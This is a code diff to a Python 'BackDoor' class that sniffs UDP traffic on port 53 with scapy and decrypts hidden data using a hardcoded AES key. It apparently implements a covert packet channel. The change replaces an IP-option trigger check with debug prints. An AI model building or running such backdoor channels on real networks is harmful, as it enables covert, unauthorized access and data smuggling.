@@ -1,6 +1,6 @@
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
-from scapy.layers.inet import UDP, IP
+from scapy.layers.inet import UDP, IP, IPOption
 from scapy.all import sniff, send
 import sys
 
@@ -12,7 +12,8 @@ class BackDoor:
         print("Backdoor has been initiated")
         self.key = b'\xac\x19\x08\xf8\x80uo\x0c5\xcb\x82_\xc9\xc0\xdc4Z=\xbf\x19\xf0O\xfa\x94\x0fW\x95\xaf=\xe9U\t'
         self.iv = b'\xe4\xba\xa2\x06\xf2\xd6U\xef\x15\xcc\xdaY\x95\xf9\xb5;'
-        self.flag = [('flag', b'\x60\x60\x60')]
+        self.flag_begin = "****["
+        self.flag_close = "]****"
         self.port = 53
         self.hex_data = ""
 
@@ -46,9 +47,11 @@ class BackDoor:
         """Gets char from ascii code"""
         return chr(ascii)
     def filter_packets(self, packet):
-        if UDP in packet and IP in packet and packet[IP].options and \
-                any(opt[0] == 'flag' and opt[1] == self.flag for opt in packet[IP].options):
-            self.process_packets(packet[UDP].sport)
+        print("1")
+        if UDP in packet:
+            print(2)
+            print(packet[UDP].payload)
+            #self.process_packets(packet[UDP].sport)
 
     def decrypt_data(self):
         encrypted_string = bytes.fromhex(self.hex_data)
